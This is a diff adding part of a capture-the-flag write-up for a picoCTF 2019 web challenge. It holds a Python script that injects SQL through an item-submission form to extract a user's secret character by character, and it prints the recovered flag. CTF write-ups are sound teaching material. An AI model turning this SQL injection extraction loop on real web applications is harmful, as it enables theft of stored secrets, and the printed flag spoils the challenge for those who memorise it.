@@ -109,4 +109,46 @@ login = my_session.post('https://2019shell1.picoctf.com/problem/27357/login',dat
 item_list = my_session.get('https://2019shell1.picoctf.com/problem/27357/list_items')
 soup2 = BeautifulSoup(item_list.text,'html.parser')
 items = [ item.next_sibling.strip('  \n\t') for item in soup2.find_all('strong')]  
-```
+```  
+
+After that we have to post our data with our sql injection query and collect results of our response : <br>  
+```python  
+while True:
+  i = i + 1
+  my_session.post('https://2019shell1.picoctf.com/problem/27357/add_item',data={'csrf_token':csrf,'item':f"'+ (SELECT hex(substr(secret,{i},1))  FROM user where id='3') +'"})
+  item_list = my_session.get('https://2019shell1.picoctf.com/problem/27357/list_items')
+  soup2 = BeautifulSoup(item_list.text,'html.parser')
+  items = [ item.next_sibling.strip('  \n\t') for item in soup2.find_all('strong')]
+  if '0' in items:
+    #pop 0
+    items.pop()
+    result.extend(items)
+    break  
+```  
+
+At the end we have to go through results and loop over possible values of hexadecimals digits , but the best way is to make post once again by substringing and comparing each letter that we already got other possible letters as hexadecimals that we got(which means if we make something like <code>'+ (SELECT (substr(secret,4,1)='o') FROM user where id='3') </code><br>  ,for example)
+Response for correct letter is going to be 1 and 0 for non existant .  
+```python  
+if len(result) > 0:
+    for idx,res in enumerate(result):
+        if len(res) == 1 and res != "0":
+            result[idx] = {'hex':res,'possible_values':[bytearray.fromhex(res + ch).decode() for ch in a_to_f]}
+            for k in result[idx]["possible_values"]:
+              print(f"Testing {idx} for {k}...")
+              my_session.post('https://2019shell1.picoctf.com/problem/27357/add_item',data={'csrf_token':csrf,'item':f"'+ (SELECT (substr(secret,{idx+1},1)='{k}')  FROM user where id='3') +'"})
+              item_list = my_session.get('https://2019shell1.picoctf.com/problem/27357/list_items')
+              soup2 = BeautifulSoup(item_list.text,'html.parser')
+              item = [ item.next_sibling.strip('  \n\t') for item in soup2.find_all('strong')][-1]
+              print("ITEM : " ,item)
+              if item == '1':
+                result[idx] = k
+                break
+        else:
+           result[idx] = bytearray.fromhex(res).decode()
+
+
+print('FLAG : ',"".join(result))  
+```  
+
+And we get the flag : <br>
+<code><b>picoCTF{wh00t_it_a_sql_inject9899be1a}</b></code>
